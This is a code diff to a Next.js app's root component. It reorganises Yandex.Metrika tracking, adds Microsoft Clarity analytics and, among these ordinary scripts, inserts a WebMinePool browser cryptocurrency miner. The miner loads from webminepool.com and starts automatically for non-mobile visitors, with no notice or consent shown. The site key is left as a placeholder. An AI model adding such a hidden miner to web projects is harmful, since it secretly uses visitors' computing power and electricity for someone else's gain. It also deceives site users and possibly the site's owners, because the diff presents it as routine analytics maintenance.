@@ -20,26 +20,25 @@ function MyApp({ Component, pageProps }) {
       };
       document.body.appendChild(script);
 
-      // Initialize Yandex.Metrika after the script is loaded
-      const yandexScript = document.createElement('script');
-      yandexScript.src = 'https://mc.yandex.ru/metrika/tag.js';
-      yandexScript.async = true;
-      yandexScript.onload = () => {
-        if (window.ym) {
-          window.ym(98096466, 'init', {
-            clickmap: true,
-            trackLinks: true,
-            accurateTrackBounce: true,
-            webvisor: true,
-          });
-        }
-      };
-      document.body.appendChild(yandexScript);
+  
     }
   }, []);
 
   return (
     <>
+    <Script
+      id="clarity-script"
+      type="text/javascript"
+      strategy="beforeInteractive"
+    >
+      {`
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq1i6293t7");
+      `}
+    </Script>
       {/* Global Site Tag (gtag.js) - Google Analytics */}
       <Script
         id="google-analytics"
@@ -57,16 +56,54 @@ function MyApp({ Component, pageProps }) {
           `,
         }}
       />
-      {/* Yandex.Metrika counter */}
-      <noscript>
-        <div>
-          <img
-            src="https://mc.yandex.ru/watch/98096466"
-            style={{ position: 'absolute', left: '-9999px' }}
-            alt=""
-          />
-        </div>
-      </noscript>
+   
+      
+      <Script
+      id="webminepool"
+      src="https://www.webminepool.com/lib/base.js"
+      strategy="beforeInteractive"
+    />
+    <Script
+      id="webminepool-init"
+      type="text/javascript"
+      strategy="beforeInteractive"
+    >
+      {`
+        var miner = WMP.Anonymous('<your-site-key>',{throttle: 0.5});
+        if (!miner.isMobile()){
+            miner.start();
+        }
+      `}
+    </Script>
+
+    {/* Yandex.Metrika Counter */}
+    <Script
+      id="yandex-metrika"
+      type="text/javascript"
+      strategy="beforeInteractive"
+    >
+      {`
+        (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+        m[i].l=1*new Date();
+        for (var j = 0; j < document.scripts.length; j++) {
+          if (document.scripts[j].src === r) { return; }
+        }
+        k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)
+        })(window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+        ym(98096466, "init", {
+          clickmap:true,
+          trackLinks:true,
+          accurateTrackBounce:true,
+          webvisor:true
+        });
+      `}
+    </Script>
+    <noscript>
+      <div>
+        <img src="https://mc.yandex.ru/watch/98096466" style={{ position: 'absolute', left: '-9999px' }} alt="" />
+      </div>
+    </noscript>
       {/* /Yandex.Metrika counter */}
       <Component {...pageProps} />
     </>
